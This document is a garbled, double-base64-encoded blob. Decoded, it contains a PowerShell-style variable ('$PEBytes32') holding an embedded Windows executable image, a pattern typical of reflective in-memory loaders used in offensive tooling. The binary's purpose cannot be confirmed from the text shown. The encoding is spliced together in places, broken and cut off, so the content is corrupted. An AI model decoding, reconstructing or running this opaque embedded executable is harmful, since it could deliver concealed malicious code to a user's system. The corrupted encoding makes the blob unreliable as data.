SUNBZ1BDOXpaV04xY21sMGVUNE5DaUFnUEM5MGNuVnpkRWx1Wm04K0RRbzhMMkZ6YzJWdFlteDVQZzBLQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFFQUVBRUFBTENpdUtMSW91Q2k2S0x3b2dpakVLTVlvMGlqVUtOWW8yQ2phS09JbzVDam1LT3dvN2lqd0tQZ28raWo4S1A0b3dDa0NLUVFwQ2lrT0tWQXBVaWxVS1d3cTdpcndLdklxOUNyNEt2b3EvQ3IrS3NBckFpc0VLd1lyQ0NzS0t3d3JEaXNRS3hJckZDc1dLeGdyR2lzY0t4NHJJQ3NpS3lRckppc29LeW9yTENzdUt6QXJNaXMwS3pZck9DczZLendyUGlzQUswSXJSQ3RHSzBnclNpdE1LMDRyVUN0U0sxUXJWaXRZSzFvclhDdGVLMkFyWWl0a0syWXJhQ3RxSzJ3cmJpdHdLM0lyZEN0MkszZ3JlaXQ4SzM0clFDdUNLNFFyaGl1SUs0b3JqQ3VPSzVBcmtpdVVLNVlybUN1YUs1d3JuaXVnSzZJcnBDdW1LNmdycWl1c0s2NHJzQ3V5SzdRcmdCUUFRQVFBUUFBNEtId29RQ2lDS0lRb2hpaUlLSW9vakNpT0tKSW9sQ2lXS0pnb21paWNLSjRvb0NpbUtLb29yQ2l1S0xBb3NpaVFLUklwRkNrV0tSZ3BHaWtjS1I0cElDa2lLU1FwSmlrb0tTb3BMQ2t1S1RBcE1pazBLVFlwRkNxV0twZ3FtaXFjS3A0cW9DcWlLcVFxcGlxb0txb3FyQ3F1S3JBcXNpcTBLcllxdUNxNktyd3F2aXFBS3NJcXhDckdLc2dxeWlyTUtzNHEwQ3JTS3RRcTFpcllLdG9xM0NyZUt1QXE0aXJrS3VZcTZDcnNLdTRxOENyeUt2UXE5aXI0S3ZvcS9DcitLc0FyQWlzRUt3WXJDQ3NLS3d3ckRpc1FLeElyRkNzV0t4Z3JHaXNjS3g0cklDc2lLeVFySmlzb0t5b3JMQ3N1S3pBck1pczBLellyT0NzNkt6d3JQaXNBSzBJclFBQUFHQUJBT2dBQUFEUW9OaWc0S0Rvb0VpcFdLbG9xWGlwaUttWXFhaXB1S25JcWRpcDZLbjRxUWlxR0tvb3FqaXFTS3BZcW1pcWVLcUlxcGlxcUtxNHFzaXEyS3JvcXZpcUNLc1lxeWlyT0t0SXExaXJhS3Q0cTRpcm1LdW9xN2lyeUt2WXEraXIrS3NJckJpc0tLdzRyRWlzV0t4b3JIaXNpS3lZcktpc3VLeklyTmlzNkt6NHJBaXRHSzBvclRpdFNLMVlyV2l0ZUsySXJaaXRxSzI0cmNpdDJLM29yZml0Q0s0WXJpaXVPSzVJcmxpdWFLNTRyb2l1bUs2b3JyaXV5SzdZcnVpdStLNElyeGl2S0s4NHIwaXZXSzlvcjNpdmlLK1lyNml2dUsvSXI5aXY2Sy80cndCd0FRRDRBQUFBQ0tBWW9DaWdPS0JJb0ZpZ2FLQjRvSWlnbUtDb29MaWd5S0RZb09pZytLQUlvUmloS0tFNG9VaWhXS0Zvb1hpaGlLR1lvYWlodUtISW9kaWg2S0g0b1FpaUdLSW9vamlpU0tKWW9taWllS0tJb3BpaXFLSzRvc2lpMktMb292aWlDS01Zb3lpak9LTklvMWlqYUtONG80aWptS09vbzdpanlLUFlvK2lqK0tNSXBCaWtLS1E0cEVpa1dLUm9wSGlraUtTWXBLaWt1S1RJcE5pazZLVDRwQWlsR0tVb3BUaWxTS1ZZcFdpbGVLV0lwWmlscUtXNHBjaWwyS1hvcGZpbENLWVlwaWltT0taSXBsaW1hS1o0cG9pbW1LYW9wcmlteUtiWXB1aW0rS1lJcHhpbktLYzRwMGluV0tkb3AzaW5BSUFCQUpRQkFBQ2dvN0Nqd0tQUW8rQ2o4S01BcEJDa0lLUXdwRUNrVUtSZ3BIQ2tnS1NRcEtDa3NLVEFwTkNrNEtUd3BBQ2xFS1VncFRDbFFLVlFwV0NsY0tXQXBaQ2xvS1d3cGNDbDBLWGdwZkNsQUtZUXBpQ21NS1pBcGxDbVlLWndwb0Nta0thZ3ByQ213S2JRcHVDbThLWUFweENuSUtjd3AwQ25VS2RncDNDbmdLZVFwNkNuc0tmQXA5Q240S2Z3cHdDb0VLZ2dxRENvUUtoUXFHQ29jS2lBcUpDb29LaXdxTUNvMEtqZ3FQQ29BS2tRcVNDcE1LbEFxVkNwWUtsd3FZQ3BrS21ncWJDcHdLblFxZUNwOEtrQXFoQ3FJS293cWtDcVVLcGdxbkNxZ0txUXFxQ3FzS3JBcXRDcTRLcndxZ0NyRUtzZ3F6Q3JRS3RRcTJDcmNLdUFxNUNyb0t1d3E4Q3IwS3ZncS9DckFLd1FyQ0NzTUt4QXJGQ3NZS3h3cklDc2tLeWdyTENzd0t6UXJPQ3M4S3dBclJDdElLMHdyVUN0VUsxZ3JYQ3RnSzJRcmFDdHNLM0FyZEN0NEszd3JRQ3VFSzRncmpDdVFLNVFybUN1Y0s2QXJwQ3VvSzZ3cnNDdTBLN2dydkN1QUs4UXJ5Q3ZNSzlBcjFDdllLOXdyNEN2a0srZ3I3Q3Z3Sy9RcitDdjhLOEFrQUVBUkFBQUFBQ2dFS0Fnb0RDZ1FLQlFvR0NnY0tDQW9KQ2dvS0N3b01DZzBLRGdvUENnQUtFUW9TQ2hNS0ZBb1ZDaFlLRndvWUNoa0tHZ29iQ2h3S0hRb1FBQUFnQVFBQUFBaUttZ3FhaXBBQUFBTUFJQVhBQUFBRENnV0tDWW9DQ2lhS0tJb3FpaXlLTG9vaGlqTUtNNG8wQ2plS09BbzdpbDBLamdxT2lvOEtqNHFBQ3BDS2tRcVJpcElLa29xVGlwUUtsSXFWQ3BXS2xncVdpcGNLbXdxZGlwQUtvd3FsQ3FlnCiAgICAkUEVCeXRlczMyID0gJ1RWcVFBQU1BQUFBRUFBQUEvLzhBQUxnQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFFQUFBNGZ1ZzRBdEFuTkliZ0JUTTBoVkdocGN5QndjbTluY21GdElHTmhibTV2ZENCaVpTQnlkVzRnYVc0Z1JFOVRJRzF2WkdVdURRMEtKQUFBQUFBQUFBQWFEays1WG04aDZsNXZJZXBlYnlIcTZ2UFE2bFp2SWVycTg5THFMbThoNnVyejArcEdieUhxTURRaTYweHZJZW93TkNUcmZXOGg2akEwSmV0T2J5SHFWeGV5NmxkdkllcGVieURxT204aDZvdzBLT3RiYnlIcWpEUWg2MTl2SWVxTU5ON3FYMjhoNm93MEkrdGZieUhxVW1samFGNXZJZW9BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQlFSUUFBVEFFR0FLL0M0bGNBQUFBQUFBQUFBT0FBQWlFTEFRNEFBQkFCQUFEY0FBQUFBQUFBdnlJQUFBQVFBQUFBSUFFQUFBQUFFQUFRQUFBQUFnQUFCUUFCQUFBQUFBQUZBQUVBQUFBQUFBQkFBZ0FBQkFBQUFBQUFBQU1BUUFFQUFCQUFBQkFBQUFBQUVBQUFFQUFBQUFBQUFCQUFBQUFnekFFQWZRQUFBS0RNQVFCa0FBQUFBQkFDQU9BQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUNBTHdRQUFEd3ZnRUFPQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ2kvQVFCQUFBQUFBQUFBQUFBQUFBQUFJQUVBVUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUM1MFpYaDBBQUFBUEE0QkFBQVFBQUFBRUFFQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUNBQUFHQXVjbVJoZEdFQUFKU3pBQUFBSUFFQUFMUUFBQUFVQVFBQUFBQUFBQUFBQUFBQUFBQkFBQUJBTG1SaGRHRUFBQURBRVFBQUFPQUJBQUFLQUFBQXlBRUFBQUFBQUFBQUFBQUFBQUFBUUFBQXdDNW5abWxrY3dBQTZBQUFBQUFBQWdBQUFnQUFBTklCQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1Y25OeVl3QUFBT0FCQUFBQUVBSUFBQUlBQUFEVUFRQUFBQUFBQUFBQUFBQUFBQUJBQUFCQUxuSmxiRzlqQUFDOEVBQUFBQ0FDQUFBU0FBQUExdJdE5ERlpYaTMwSWhjbDFBNDFQSUl0RkVJbEhNSXRGRklsSE5JMUhHRkJYYUNNUkFCQlI2Q3cvQUFDTDhJUEVFSVgyZEExK0hnKzM5b0hPQUFBSGdPc1RpMDhFRDdjQlVGRnFBbGZvQ1FBQUFJUEVFRitMeGw1ZHcxV0w3UDkxRkl0RkNQOTFFUDkxRFA5d0hQOXdHT2dqUHdBQWc4UVVoY0IrQ0ErM3dBMEFBQWVBWGNOVmkreFdpM1VJLzNZYy8zWVk2RU0vQUFDRFpoZ0FnMlljQUZsWlhsM0RWWXZzaTBVTU05Sld2aXdpQVJDRndIUVFpOUNMOEkxS0FZb0NRb1RBZGZrcjBZdE5DSTFDQVlOaEJBQ0RZUXdBaVRHSlFRaGVYY05WaSt5TFJReFdWelAvdmpBaUFSQ0wxNFhBZEJhTDBJdndqVW9DWm9zQ2c4SUNaanZIZGZVcjBkSDZpMDBJalFSVkFnQUFBSWw1QklsNURGK0pNWWxCQ0Y1ZHcxV0w3SXRGS0lYQWRHcUxUUXlMVlJCVGkxMGNWNHQ5SUlQcEFIUXFnK2tCZFNpRTBuUUdEN2JLUWVzRnVRQUJBQUNKQ0l0TkZJbElDSXROR0lsSURJbFlFSWw0Rk9zR2d5QUFpMDBZVm90d01JWDJkQnovY0RUL2RTUlhVMUgvZFJTTHpsTC9kUXovZFFqb0VSa0FBUC9XWGw5YlhjSWtBRldMN0l0RkRBdEZFSFF0aTFVSWkwb0lpMElNSTAwTUkwVVFDOGgwRm90Q0VJdEtGQ05GRENOTkVEdENFSFVGTzBvVWRBUXl3RjNEc0FGZHcxV0w3SVBzRUtEYndRRVFpMVVNaThwV2kzVUlnZWtvd1FFUWdja0FBQUFMaXdLSlJmU0xRZ1NKUmZpTFFnaUR3Z3lKVGZDTFRSeUpSZnlMUmdSUmcyRUVBUDkxR0lrQmkwWUUvM1VVLzNVUUQ3Y0FnMkVVQUlsQkNNZEJEQUlBQUFDSlVSQVB0d0tKUVJpTlJmQlF4MEVjQVFBQUFQOTJIUDkyR09qQVBRQUFnOFFjWG92bFhjUE1hREFlQVJEb3poVUFBRm5Eek16TXpGV0w3SVBzS0tFRTRBRVFNOFdKUmZ4VFZsZHFDVmt6d0kxOTJQT3JhSmgzQVJBeTIvOFZIQ0FCRUl2d2hmWjBJMmkwZHdFUVZ2OFZHQ0FCRUlYQWRBaU5UZGhSLzlEK3cxYi9GUlFnQVJDRTIzVUtqVVhZVVA4VkNDQUJFQSszVGRoZlhsdUZ5WFFXZy9rR2RBMHowb1A1Q1dvRVdBOUZ3dXNIYWdMckFtb0lXSXROL0RQTjZGWU1BQUNMNVYzRFZZdnNnZXlFQWdBQW9RVGdBUkF6eFlsRi9GT0x3VFBiaVlXRS9mLy9WNHY2aGNCMUJ6TEE2VW9CQUFBNUh3K0VRQUVBQUZhTE5SZ2dBUkJveUhjQkVQODMvOWFKaFlEOS8vK0Z3QStFSVFFQUFHallkd0VRL3pmLzFtanNkd0VRL3plTDhQOFZHQ0FCRUltRmZQMy8vNFgyRDRUN0FBQUFNLy9IaFl6OS8vOHlBQUFBUjRYQUQ0V1JBQUFBaTRXRS9mLy92Z1I0QVJDTHptYUxFR1k3RVhVZVpvWFNkQlZtaTFBQ1pqdFJBblVQZzhBRWc4RUVab1hTZGQ2THcrc0VHOEFMeDRYQWRWYU5oWXo5Ly85UWFqS05SWmhRLzVXQS9mLy9oY0FQaUpBQUFBQ05SWmhtaXdobU93NTFJV2FGeVhRVlpvdElBbVk3VGdKMUVvUEFCSVBHQkdhRnlYWGVNOG1MdzBIckJ4dkFNOGxCQzhHRndIVlppdG5yVlZlTFBRd2dBUkQvMTR2d2laMkkvZi8vNkQzKy8vK05oWXo5Ly85UWFqS05SWmhRallXSS9mLy9VR2dFQVFBQWpZV1EvZi8vVUZOcUJsUC90WVQ5Ly85VC81VjgvZi8vYWdHRndBKzIyMWhXRDBuWS85ZGVpc09MVGZ4Zk04MWI2TkFLQUFDTDVWM0RWWXZzZytUNGcrd01vUVRnQVJBenhJbEVKQWhXYWdKcUFQOFZTQ0VCRUlOa0pBZ0FqVXdrQ09qa0J3QUFoY0I0S1l0MEpBaUY5blFoVVl2RVZva3dpd2IvVUFTNktIZ0JFTG5nZ3dFUTZHVUdBQUJaL3hWRUlRRVFpMHdrREY0enpPaG1DZ0FBaStWZHcxV0w3SXRGRElQb0FYUVZnK2dGZFJpTFRSQ0Z5WFFSb1p6eEFSQ0pBZXNJaTBVSW81enhBUkF6d0VCZHdnd0Fpd21GeVhRR2l3RlIvMUFJdzFXTDdJdEZCRjNEVll2c2crd3dVelBBVmxlTCtJbEY3SWxGNklsOThJbEY1T2phLy8vL2k5aTRUVm9BQUdZNUEzVVhpME04alVqQWdmbS9Bd0FBZHdtQlBCaFFSUUFBZEFOTDY5eGtvVEFBQUFDSlhlREhSZGdEQUFBQXgwWFFBZ0FBQUl0QURNZEYxQUVBQUFDTFFCU0pSZnlGd0ErRWxRRUFBSXZZaTFNb004a1B0M01raWdMQnlRMDhZUSsyd0hJRGc4SGdBOGlCeHYvL0FBQkNab1gyZGVPQitWdThTbW9QaGJjQUFBQ0xjeEJxQTR0R1BJdEVNSGdEeG9sRjNJdDRJSXRBSkFQK0E4YUpSZlNMWGZSWWlVWDRpdzhEempQU2lnSEJ5ZzBQdnNBRDBFR0tBWVRBZGZHQitvNU9EdXgwRUlINnF2d05mSFFJZ2ZwVXlxK1JkVTJMUmR3UHR3dUxRQnlOQklpQitvNU9EdXgxQ29zRU1BUEdpVVhzNnlLQitxcjhEWHgxQ29zRU1BUEdpVVhvNnhDQitsVEtyNUYxQ0lzRU1BUEdpVVh3aTBYNEJmLy9BQUNKUmZqckE0dEYrR29DV1lQSEJBUFpab1hBRDRWdy8vLy82MzZCK1YxbytqeDFmSXRURUl0Q1BJdEVFSGdEd29sRjNJdGQzSXQ0SUl0QUpBUDZBOEtKUmZRendFQ0pSZmlMRHdQS00vYUtBY0hPRFErK3dBUHdRWW9CaE1CMThZSCt1QXBNVTNVaGkwWDBEN2NJaTBNY2pRU0lpd1FRQThLSlJlU0xSZmdGLy84QUFJbEYrT3NEaTBYNGFnSlpBVTMwZzhjRVpvWEFkYStMZmZDTFhmeURmZXdBZEJDRGZlZ0FkQXFGLzNRR2czM2tBSFVOaXh1SlhmeUYydytGY1A3Ly80dGQ0SXR6UEdwQUEvTm9BREFBQUlsMTlQOTJVR29BLzllTFZsU0wrSWw5OEl2TGhkSjBFeXY3aVgzY2lnR0lCQTlCZytvQmRmV0xmZkFQdDBZR0Q3ZE9GSVhBZERtRHdTd0R6b3RSK0VpTE1RUFhpVVhnQS9PTFFmeUpSZHlGd0hRUWkvaUtCb2dDUWthRDd3RjE5WXQ5OEl0RjRJUEJLSVhBZGMrTGRmU0xub0FBQUFBRDM0bGQrSXRERElYQWRIa0R4MUQvVmV5TGN4Q0pSZHdEOTRzREE4ZUpSZUNEUGdCMFQ0dGQzSVhBZENLTENJWEplUnlMUXp3UHQ4bUxSQmg0SzB3WUVJdEVHQnlOQklpTEJCZ0R3K3NNaXdhRHdBSUR4MUJULzFYb2lRYUR4Z1NMUmVDRndIUUdnOEFFaVVYZ2d6NEFkYmVMWGZpTFF5Q0R3eFNKWGZpRndIV0tpM1gwaThjclJqU0R2cVFBQUFBQWlVWGNENFNxQUFBQWk1NmdBQUFBQTkrSlhlQ05Td1NMQVlsTjZJWEFENFNQQUFBQWkzWGNpeE9Ed1BnRDE5SG9pVVhjalVNSWlVWHNkR0NMZmR5TDJBKzNDMDltaThGbXdlZ01ab1A0Q25RR1pqdEYySFVMZ2VIL0R3QUFBVFFSNnlkbU8wWFVkUkdCNGY4UEFBQ0x4c0hvRUdZQkJCSHJFR1k3UmRCMUNvSGgvdzhBQUdZQk5CRnFBbGdEMklYL2RhNkxmZkNMWGVDTFRlZ0RHWWxkNEkxTEJJc0JpVTNvaGNBUGhYZi8vLytMZGZTTGRpaHFBR29BYXY4RDkvOVY1UDkxQ0RQQVFGQlgvOVpmaThaZVc0dmxYY0lFQUdvRXVFMGRBUkRvMHZZQUFJdlphZ3pvTndZQUFJdndXWWwxOElObC9BQ0Y5blFlLzNVSWkvNHp3S3VycTRObUJBREhSZ2dCQUFBQTZKOFRBQUNKQnVzQ00vYURUZnovaVRPRjluVUthQTRBQjREb1pSTUFBSXZENkZyMkFBRENCQUJXaS9HTERvWEpkQWpvQlFBQUFJTW1BRjdEVm92eFY0MUdDRkQvRlJBZ0FSQ0wrSVgvZFMrRjluUXJPUVowQ3Y4Mi94VTRJUUVRSVQ2RGZnUUFkQTMvZGdUbzF3VUFBSU5tQkFCWmFneFc2SWtGQUFCWldZdkhYMTdEVWY4Vk1DRUJFTU5WaSt5RDdCQ2hCT0FCRURQRmlVWDhpMFVJZzJYMEFJTmw4QUJUVmxkb1RJUUJFUDh3aS9xTDhUTGIveFVZSUFFUWhjQjFFR2hnaEFFUTZQZ0VBQUJaNllrQUFBQ05UZlJSYU5pS0FSQm85SU1CRVAvUWhjQjVEbEJvd0lRQkVPalRCQUFBV2V2WWkwWDBqVlh3VW1qSWlnRVFWb3NJVVA5UkRJWEFlUWhRYUJDRkFSRHIyWXRGOEkxVitGSlFpd2ovVVNpRndIa0lVR2h3aFFFUTY4Q0RmZmdBZFFkbzJJVUJFT3VPaTBYd1YyaTRpZ0VRYUJoNEFSQ0xDRkQvVVNTRndIa0lVR2d3aGdFUTY1T3pBWXROOUlYSmRBcUxBVkgvVUFpRFpmUUFpMVh3aGRKMEJvc0tVdjlSQ0l0Ti9JckRYMTR6elZ2b2JnUUFBSXZsWGNOVmkreFRhTmgzQVJEL01qTGIveFVZSUFFUWhjQjFEV2lZaGdFUTZCY0VBQUJaNnkzL2RRaG91SW9CRUdnWWVBRVFhT0NHQVJCb0hJUUJFUC9RaGNCNURsQm82SVlCRU9qc0F3QUFXZXZTc3dHS3cxdGR3MnBBdUowZEFSRG83ZlFBQUl2eWlVMjBnMlg4QUdvTTZCY0VBQUNMMkZtSlhlakdSZndCaGR0ME1JdjdNOENycTZ1TGZiU0RZd1FBVjhkRENBRUFBQUQvRlR3aEFSQ0pBNFhBZFJDRi8zUU1hQTRBQjREb1NSRUFBRFBieGtYOEFJbGQ2SVhiZE9scUNGakdSZndDVm1hSlJkai9GVHdoQVJDSlJlQ0Z3SFVFaGZaMXpJczFOQ0VCRUkxRnVGRC8xbzFGeUZELzFtb0JhZ0JxRE1aRi9BWC9GU3doQVJDRFpld0FpL0NOUmRpSmRiUlFqVVhzVUZiL0ZTZ2hBUkNGd0hrSVVHZzRod0VRNno2TFJRaUZ3SFVLYUFOQUFJRHBldi8vLzRzSWpWVzRVbGFEN0JDTmRjaUwvR29BcFdnWUFRQUEvek9sVUtXbC81SGtBQUFBaGNCNUQxQm9rSWNCRU9qVkFnQUFXVm5yRXY5MXdPakpBZ0FBV2Y5MXRQOFZKQ0VCRUlzMU1DRUJFSTFGeUZELzFvMUZ1RkQvMW8xRjJGRC8xb3ZMNkJuOS8vK0RUZnovaTBVSWhjQjBCb3NJVVA5UkNPaGM4d0FBdzJvc3VPb2RBUkRvbFBNQUFJbE55RFBiaS9PSlhkQ0pYZVNKWGZ5SlhkekdSZndCalUzVWFPQ0hBUkNKWGRUb1cvei8vNGxkNE1aRi9BT05UZGhvOUljQkVJbGQyT2hFL1AvL2FBU0VBUkRHUmZ3RS94VWNJQUVRaTMzWWlVWE1oY0FQaExRQkFBQ05WY3k1SElRQkVPajE5Zi8valZYTXVUU0VBUkNLMk9qbTlmLy9oTUIwSEkxRnpMa2NoQUVRalZYUVVJVGJkUVc1TklRQkVPaXgvUC8vNnhDRTIzUVJqVVhRVUkxVnpPaWUvZi8vV1RQYjZ3UXoyNHJEaE1BUGhGY0JBQUNMUmRCUWl3ai9VU2lMOElYMmVSRldhR0NJQVJEb3F3RUFBRm5wUVFFQUFJdEY1SVhBZEFhTENGRC9VUWlMUmRDTlZlU0pYZVJTVUlzSS8xRTBpL0NGOW5rSVZtaW9pQUVRNjhxTFJlU0Z3SFFHaXdoUS8xRUlpMFhRalZYa2lWM2tVbENMQ1A5Uk5JdndoZlo1Q0Zab0lJa0JFT3VmaTNYa2hmWjFDbWdEUUFDQTZQOE9BQUNMUmR5RndIUUdpd2hRLzFFSWpVM2NpVjNjaXdaUmFLaUtBUkJXL3hDTDhJWDJlUXRXYUpDSkFSRHBYLy8vLzQxRjZJbGQ3RkJxQWI0QU5BQUFhaEdKZGVqL0ZTQWhBUkNMMkZQL0ZSd2hBUkJXYU9pS0FSRC9jd3pvRVBjQUFJUEVERlAvRlJnaEFSQ0xkZHlGOW5TR2kwWGdoY0IwQm9zSVVQOVJDSU5sNEFDTlRlQ0xCbEZUVnYrUXRBQUFBSXZ3aGZaNUMxWm84SWtCRU9udS92Ly9pMFhnaGNBUGhFdi8vLytGLzNRRWl4ZnJBalBTLzNYSWl3aFNVUDlSUkl2d2hmWjVGbFpvU0lvQkVPbSsvdi8vYUJpSUFSRG9aQUFBQUZtTFRkQ0Z5WFFLaXdGUi8xQUlnMlhRQUlYL2RBZUx6K2pBK3YvL3hrWDhBb3RGNElYQWRBYUxDRkQvVVFpTFRkU0Z5WFFGNktQNi8vL0dSZndBaTBYY2hjQjBCb3NJVVA5UkNJTk4vUCtMUmVTRndIUUdpd2hRLzFFSWk4Ym8wL0FBQU1OVmkreFdpM1VJYWdIb3NqWUFBRm1OVFF4UmFnQldVT2dRQUFBQS8zQUUvekRvMzBrQUFJUEVHRjVkdzdpbzhRRVF3enNOQk9BQkVQSjFBdkxEOHVtb0F3QUFWWXZzLzNVSTZKZ0VBQUJaWGNOVmkrenJILzkxQ09neVNnQUFXWVhBZFJLRGZRai9kUWZvZGdVQUFPc0Y2RklGQUFEL2RRam9xVW9BQUZtRndIVFVYY1BwWFFRQUFGV0w3SXRGRElQb0FIUXpnK2dCZENDRDZBRjBFWVBvQVhRRk04QkE2ekRvSHdZQUFPc0Y2UGtGQUFBUHRzRHJILzkxRVA5MUNPZ2FBQUFBV2VzUWczMFFBQStWd0ErMndGRG9HUUVBQUZsZHdnd0F6TXhxRUdnb3hnRVE2S2NLQUFCcUFPaExCZ0FBV1lUQWRRY3p3T25nQUFBQTZGQUZBQUNJUmVPekFZaGQ1NE5sL0FDRFBjenJBUkFBZEFkcUIranRDQUFBeHdYTTZ3RVFBUUFBQU9oeUJRQUFoTUIwWmVqNENRQUFhSGdxQUJEbzJRY0FBT2lGQ0FBQXh3UWs5U2dBRU9qSUJ3QUE2SklJQUFESEJDUndJUUVRYUdBaEFSRG9Ka29BQUZsWmhjQjFLZWdWQlFBQWhNQjBJR2hjSVFFUWFGUWhBUkRvckVrQUFGbFp4d1hNNndFUUFnQUFBRExiaUYzbngwWDgvdi8vLytoRUFBQUFoTnNQaFV6Ly8vL29WZ2dBQUl2d2d6NEFkQjVXNkZBR0FBQlpoTUIwRS85MURHb0MvM1VJaXphTHp1aXlDUUFBLzliL0Jham9BUkF6d0VEbzlRa0FBTU9LWGVmL2RlUG9xd1lBQUZuRGFneG9TTVlCRU9pVkNRQUFvYWpvQVJDRndIOEVNOERyVDBpanFPZ0JFT2crQkFBQWlFWGtnMlg4QUlNOXpPc0JFQUowQjJvSDZPQUhBQURvM0FRQUFJTWx6T3NCRUFESFJmeisvLy8vNkJzQUFBQnFBUDkxQ09ocEJnQUFXVmt6eVlUQUQ1WEJpOEhvZWdrQUFNUG96QVFBQVA5MTVPZ3VCZ0FBV2NOcURHaG94Z0VRNkJnSkFBQ0RaZndBaTMwTWcvOEJkQXFEL3dKMEJZdGRDT3N4LzNVUVY0dGRDRlBvMmdBQUFJdndpWFhraGZZUGhMNEFBQUQvZFJCWFUralcvZi8vaS9DSmRlU0Y5ZytFcHdBQUFJUC9BWFVIVStneUd3QUFXZjkxRUZkVDZQcnkvLytMOElsMTVJUC9BWFVyaGZaMUh2OTFFRkJUNk9MeS8vLy9kUkJXVStpUi9mLy8vM1VRVmxQb2RBQUFBSVAvQVhVRWhmWjBCSVgvZFF0VDZJUWJBQUJaaGY5MEJZUC9BM1ZJLzNVUVYxUG9ZUDMvLzR2d2lYWGtoZlowTmY5MUVGZFQ2RG9BQUFDTDhPc2tpMDNzaXdGUi96Qm9xQjhBRVA5MUVQOTFEUDkxQ09oK0F3QUFnOFFZdzR0bDZEUDJpWFhreDBYOC92Ly8vNHZHNkdJSUFBRERWWXZzVm9zMWtDRUJFSVgyZFFVendFRHJFdjkxRUl2Ty8zVU0vM1VJNk9zSEFBRC8xbDVkd2d3QVZZdnNnMzBNQVhVRjZJQUZBQUQvZFJEL2RRei9kUWpvc2Y3Ly80UEVERjNDREFCVmkreHFBUDhWUkNBQkVQOTFDUDhWUUNBQkVHZ0pCQURBL3hWSUlBRVFVUDhWVENBQkVGM0RWWXZzZ2V3a0F3QUFhaGZvZHV3QUFJWEFkQVZxQWxuTkthT3c2UUVRaVEyczZRRVFpUldvNlFFUWlSMms2UUVRaVRXZzZRRVFpVDJjNlFFUVpvd1Z5T2tCRUdhTURienBBUkJtakIyWTZRRVFab3dGbE9rQkVHYU1KWkRwQVJCbWpDMk02UUVRbkk4RndPa0JFSXRGQUtPMDZRRVFpMFVFbzdqcEFSQ05SUWlqeE9rQkVJdUYzUHovLzhjRkFPa0JFQUVBQVFDaHVPa0JFS084NkFFUXh3V3c2QUVRQ1FRQXdNY0Z0T2dCRUFFQUFBREhCY0RvQVJBQkFBQUFhZ1JZYThBQXg0REU2QUVRQWdBQUFHb0VXR3ZBQUlzTkJPQUJFSWxNQmZocUJGakI0QUNMRFFEZ0FSQ0pUQVg0YUpRaEFSRG80ZjcvLzR2bFhjUHA1MFlBQUZXTDdGRlcvM1VJaS9HSmRmem9ZQUFBQU1jR3dDRUJFSXZHWG92bFhjSUVBSU5oQkFDTHdZTmhDQURIUVFUSUlRRVF4d0hBSVFFUXcxV0w3RkZXLzNVSWkvR0pkZnpvSndBQUFNY0czQ0VCRUl2R1hvdmxYY0lFQUlOaEJBQ0x3WU5oQ0FESFFRVGtJUUVReHdIY0lRRVF3MVdMN0ZhTDhZMUdCTWNHb0NFQkVJTWdBSU5nQkFCUWkwVUlnOEFFVU9oN0d3QUFXVm1MeGw1ZHdnUUFqVUVFeHdHZ0lRRVFVT2pHR3dBQVdjTlZpK3hXaS9HTlJnVEhCcUFoQVJCUTZLOGJBQUQyUlFnQldYUUthZ3hXNklYNi8vOVpXWXZHWGwzQ0JBQlZpK3lEN0F5TlRmVG9OLy8vLzJpRXhnRVFqVVgwVU9pYUd3QUF6RldMN0lQc0RJMU45T2hULy8vL2FOakdBUkNOUmZSUTZIMGJBQURNaTBFRWhjQjFCYmlvSVFFUXcxV0w3SXRGQ0ZhTFNEd0R5QSszUVJTTlVSZ0QwQSszUVFacjhDZ0Q4anZXZEJtTFRRdzdTZ3h5Q290Q0NBTkNERHZJY2d5RHdpZzcxblhxTThCZVhjT0x3dXY1NkZrSEFBQ0Z3SFVETXNERFpLRVlBQUFBVnI3UTZ3RVFpMUFFNndRNzBIUVFNOENMeXZBUHNRNkZ3SFh3TXNCZXc3QUJYc1BvSkFjQUFJWEFkQWZvZWdVQUFPc0Y2RnBMQUFDd0FjTnFBT2pQQUFBQWhNQlpENVhBdytobkd3QUFoTUIxQXpMQXcraEpVQUFBaE1CMUIraGRHd0FBNisyd0FjUG9RVkFBQU9oT0d3QUFzQUhEVll2czZNOEdBQUNGd0hVWWczME1BWFVTLzNVUWkwMFVVUDkxQ09pS0JBQUEvMVVVLzNVYy8zVVk2TTlFQUFCWldWM0Q2SjhHQUFDRndIUU1hTlRyQVJEb1pFNEFBRm5ENkpOSUFBQ0Z3QStFWmtnQUFNTnFBT2oyVHdBQVdla1hHd0FBVll2c2czMElBSFVIeGdYczZ3RVFBZWkrQkFBQTZKVWFBQUNFd0hVRU1zQmR3K2lTVHdBQWhNQjFDbW9BNk1FYUFBQlo2K213QVYzRFZZdnNnK3dNVm90MUNJWDJkQVdEL2dGMWZPZ2pCZ0FBaGNCMEtvWDJkU1pvMU9zQkVPZ0JUZ0FBV1lYQWRBUXl3T3RYYU9EckFSRG83azBBQVBmWVdSckEvc0RyUktFRTRBRVFqWFgwVjRQZ0g3L1U2d0VRYWlCWks4aUR5UC9UeURNRkJPQUJFSWxGOUlsRitJbEYvS1dscGIvZzZ3RVFpVVgwaVVYNGpYWDBpVVg4c0FHbHBhVmZYb3ZsWGNOcUJlZ0FBZ0FBekdvSWFCakhBUkRvZVFNQUFJTmwvQUM0VFZvQUFHWTVCUUFBQUJCMVlLRThBQUFRZ2JnQUFBQVFVRVVBQUhWUHVRc0JBQUJtT1lnWUFBQVFkVUdMUlFpNUFBQUFFQ3ZCVUZIb3RQMy8vMWxaaGNCMEt2ZEFKQUFBQUlCMUljZEYvUDcvLy8rd0Flc2ZpMFhzaXdBenlZRTRCUUFBd0ErVXdZdkJ3NHRsNk1kRi9QNy8vLzh5d09nL0F3QUF3MVdMN09nUEJRQUFoY0IwRDRCOUNBQjFDVFBBdWREckFSQ0hBVjNEVll2c2dEM3M2d0VRQUhRR2dIME1BSFVTLzNVSTZFcE9BQUQvZFFqb1Z4a0FBRmxac0FGZHcxV0w3S0VFNEFFUWk4Z3pCZFRyQVJDRDRSLy9kUWpUeU